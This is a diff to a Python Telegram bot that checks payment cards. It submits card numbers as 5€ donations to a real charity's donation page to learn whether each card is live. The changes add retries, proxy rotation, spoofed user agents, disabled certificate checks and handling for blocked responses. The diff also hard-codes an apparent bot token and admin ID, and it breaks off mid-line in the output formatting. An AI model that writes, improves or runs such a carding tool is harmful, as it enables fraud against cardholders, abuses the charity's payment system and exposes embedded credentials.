@@ -9,7 +9,6 @@ from user_agent import generate_user_agent
 logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
 logger = logging.getLogger(__name__)
 
-# ========================= CONFIG =========================
 BOT_TOKEN = '8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0'
 ADMIN_ID = 7077294261
 
@@ -42,24 +41,26 @@ def release_proxy(p):
 bot = telebot.TeleBot(BOT_TOKEN)
 logger.info("Bot Started")
 
-# ====================== CHECKER (5€) ======================
+# ====================== CHECKER (5€ + Fixed Connection) ======================
 def check_cc(ccx):
-    for attempt in range(5):
+    for attempt in range(6):
         proxy_dict, proxy_str = get_random_proxy() if USE_PROXY else (None, None)
         logger.info(f"Attempt {attempt+1} | {ccx[:6]}xxxx | Proxy: {'ON' if proxy_dict else 'OFF'}")
 
         try:
             session = requests.Session()
             session.verify = False
+            session.keep_alive = False
             if proxy_dict:
                 session.proxies.update(proxy_dict)
 
             us = generate_user_agent()
 
             r = session.get('https://www.rarediseasesinternational.org/donate/', 
-                           headers={'User-Agent': us}, timeout=35)
+                           headers={'User-Agent': us, 'Connection': 'close'}, 
+                           timeout=40)
 
-            if 'cf-ray' in r.headers or r.status_code == 403:
+            if r.status_code != 200:
                 continue
 
             m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text)
@@ -91,7 +92,8 @@ def check_cc(ccx):
             return "DECLINED", "5€ Submitted"
 
         except Exception as e:
-            logger.warning(f"Attempt failed: {str(e)[:80]}")
+            logger.warning(f"Attempt {attempt+1} failed: {str(e)[:80]}")
+            time.sleep(2)
             continue
 
     return "ERROR", "All Attempts Failed"
@@ -105,8 +107,6 @@ def start(message):
 def pp(message):
     try:
         cc = message.text.split()[1]
-        if len(cc.split('|')) < 4:
-            raise ValueError
     except:
         return bot.reply_to(message, "Usage: /pp 411111|04|28|123")
 
@@ -118,12 +118,4 @@ def pp(message):
 
     res = f"""
 𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
-𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response}
-Amount: 5€
-"""
-    bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")
-
-if __name__ == "__main__":
-    logger.info("=== BOT RUNNING ===")
-    bot.infinity_polling()
+𝐒𝐭
